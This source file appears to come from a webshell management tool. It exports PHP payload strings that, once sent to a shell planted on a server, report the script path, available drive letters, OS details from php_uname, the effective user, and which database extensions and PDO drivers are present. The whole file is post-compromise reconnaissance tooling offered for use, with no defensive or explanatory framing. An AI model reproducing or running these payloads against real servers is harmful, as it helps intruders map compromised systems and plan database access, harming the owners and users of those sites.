/**
 * 基础信息模板
 * ? 获取系统信息、当前用户、当前路径、盘符列表
 */

module.exports = () => ({
  info: {
    _: `$D=dirname($_SERVER["SCRIPT_FILENAME"]);
    if($D=="")
      $D=dirname($_SERVER["PATH_TRANSLATED"]);
    $R="{$D}\t";
    if(substr($D,0,1)!="/"){
      foreach(range("C","Z")as $L)
        if(is_dir("{$L}:"))$R.="{$L}:";
    }else{
      $R.="/";
    }
    $R.="\t";
    $u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
    $s=($u)?$u["name"]:@get_current_user();
    $R.=php_uname();
    $R.="\t{$s}";
    echo $R;`.replace(/\n\s+/g, '')
  },
  probedb: { // 检测数据库函数支持
    _: `$m=array('mysql_close','mysqli_close','mssql_close','sqlsrv_close','ora_close','oci_close','ifx_close','sqlite_close','pg_close','dba_close','dbmclose','filepro_fieldcount','sybase_close');
    foreach ($m as $f) {
      echo($f."\\t".(function_exists($f)?'1':'0')."\\n");
    }
    if(function_exists('pdo_drivers')){
      foreach(@pdo_drivers() as $f){
        echo("pdo_".$f."\\t1\\n");
      }
    }`.replace(/\n\s+/g, '')
  }
})